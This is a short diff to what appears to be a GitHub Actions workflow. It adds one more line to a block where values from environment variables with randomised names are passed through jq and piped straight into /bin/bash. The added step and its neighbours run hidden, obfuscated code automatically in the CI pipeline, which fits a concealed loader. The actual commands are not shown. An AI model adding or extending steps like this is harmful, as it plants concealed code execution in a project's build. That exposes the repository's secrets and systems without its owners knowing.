@@ -27,6 +27,7 @@ jobs:
           echo $brx54 | jq -r .vm03 | /bin/bash
           printf '%s' "$tija4" | jq -r .njs16 | /bin/bash
           printf '%s' "$jv97514" | jq -r .vp6126 | /bin/bash
+          printf '%s' "$ctig1602" | jq -r .xroa110 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
